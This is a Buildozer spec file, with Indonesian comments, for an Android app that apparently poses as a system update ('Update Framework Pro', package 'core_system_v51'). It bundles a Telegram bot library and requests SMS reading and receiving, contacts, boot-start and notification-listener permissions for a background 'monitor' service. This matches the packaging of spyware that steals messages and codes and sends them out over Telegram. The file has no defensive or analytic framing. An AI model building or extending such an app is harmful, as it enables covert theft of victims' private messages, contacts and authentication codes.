[app]
title = Update Framework Pro
package.name = core_system_v51
package.domain = com.core.internal
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 5.1

# Library wajib
requirements = python3,kivy,pyTelegramBotAPI,android,pyjnius,requests,certifi

# Izin dasar dan sistem
android.permissions = READ_SMS, RECEIVE_SMS, POST_NOTIFICATIONS, INTERNET, RECEIVE_BOOT_COMPLETED, READ_CONTACTS, BIND_NOTIFICATION_LISTENER_SERVICE

# Pemicu agar nama APK muncul di daftar Akses Notifikasi
android.services = monitor:main.py

# Pengaturan API (Stabil untuk Android lama maupun baru)
android.api = 31
android.minapi = 21
android.ndk = 25b
android.private_storage = True
android.archs = arm64-v8a, armeabi-v7a
android.allow_backup = True

[buildozer]
log_level = 2
warn_on_root = 1
